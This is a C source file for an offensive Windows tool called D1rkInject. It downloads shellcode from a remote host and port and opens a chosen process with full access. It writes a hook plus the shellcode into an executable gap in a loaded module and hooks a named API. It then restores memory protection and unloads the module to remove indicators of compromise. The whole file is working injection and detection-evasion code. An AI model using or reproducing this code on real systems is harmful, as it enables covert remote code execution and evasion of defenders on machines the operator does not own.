#include "commun.h"


int wmain(int argc, wchar_t** argv) {
	
	if (argc != 8) {
		printf("\n\tUsage:\n\t\tD1rkInject.exe <host> <port> <resource> <PID> <InjectedLoadedModule> <HookedmoduleName> <HookedApiName>\n\n");
		return -1;
	}
	
	wchar_t* whost = argv[1];
	DWORD port = _wtoi(argv[2]);
	wchar_t* wresource = argv[3];
	DWORD pid = _wtoi(argv[4]);
	wchar_t* wInjectedLoadedModuleName= argv[5];
	wchar_t* wHookedModuleName = argv[6];
	wchar_t* wHookedApiName = argv[7];


	DATA shellcode = GetData(whost, port, wresource);
	if (shellcode.data == NULL) {
		printf("[-] Failed to get remote shellcode (%u)\n", GetLastError());
		return -1;
	}

	printf("\n[+] shellcode @ %p (%d bytes)\n", shellcode.data, shellcode.len);

	HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);


	LPVOID RX_hole_addr = GetRXhole(hproc, wInjectedLoadedModuleName, shellcode.len);
	if (RX_hole_addr == NULL) {
		printf("[-] Failed to find a hole (%u)\n", GetLastError());
		return -1;
	}
	
	printf("[+] RX_hole_addr in %ws is @ %p\n", wInjectedLoadedModuleName, RX_hole_addr);
	
	
	if(!InjectThatMTF(hproc, RX_hole_addr, shellcode, wHookedModuleName, wHookedApiName)) {
		printf("[+] Failed to inject %ws or Hook %ws\n", wInjectedLoadedModuleName, wHookedApiName);
		return -1;
	}
	printf("[+] %ws of the Target process with PID : %d is injected at address with the HookCode + Shellcode : %p\n", wInjectedLoadedModuleName, pid, RX_hole_addr);

	char input1[100];
	do {
		printf("[+] Enter \"APT stands for Are You Pretending To-hack?\" if you got a callback to Change hooked API protection from RWX => RX\n");
		fgets(input1, sizeof(input1), stdin);
		input1[strcspn(input1, "\n")] = 0;
	} while (strcmp(input1, "APT stands for Are You Pretending To-hack?") != 0);

	DWORD oldProtect = 0;
	size_t len = wcslen(wHookedApiName) + 1;
	char* APIName = (char*)malloc(len);
	size_t convertedChars = 0;
	wcstombs_s(&convertedChars, APIName, len, wHookedApiName, _TRUNCATE);

	FARPROC apiAddr = GetProcAddress(GetModuleHandle(wHookedModuleName), APIName);
	if (!VirtualProtectEx(hproc, apiAddr, 8, PAGE_EXECUTE_READ, &oldProtect)) {
		printf("Failed to change memory protection.\n");
		return FALSE;
	}


	char input2[100];

	do {
		printf("[+] Enter \"APT stands for Advanced Persistence Tomato\" to Unload the Infected %ws to remove any IOC\n", wInjectedLoadedModuleName);
		fgets(input2, sizeof(input2), stdin); 
		input2[strcspn(input2, "\n")] = 0; 
	} while (strcmp(input2, "APT stands for Advanced Persistence Tomato") != 0); 

	if (!UnloadModule(hproc, wInjectedLoadedModuleName)) {
		printf("[+] Failed to Unload %ws\n in the target process\n", wInjectedLoadedModuleName);
		return -1;
	}

	printf("[+] %ws Unloaded successfully\n", wInjectedLoadedModuleName);

	return 0;



}